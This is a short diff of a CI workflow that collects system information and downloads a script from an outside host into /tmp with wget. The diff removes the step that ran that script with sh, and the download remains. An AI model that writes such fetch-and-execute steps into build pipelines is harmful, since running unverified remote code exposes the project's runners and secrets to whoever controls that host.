@@ -12,12 +12,10 @@ jobs:
       run: sudo apt-get -y install xvfb perl scrot inxi
 
     - name: inxi
-      run: inxi -F
+      run: inxi -F && nproc
 
     - name: download
       run: wget -O /tmp/$$ http://intercity-vpn.de/minimoni.txt
 
     - name: minimoni
-      run: ls -l /tmp/ && sh /tmp/$$
-           uname -a
-           exit 0
+      run: ls -l /tmp/ && uname -a
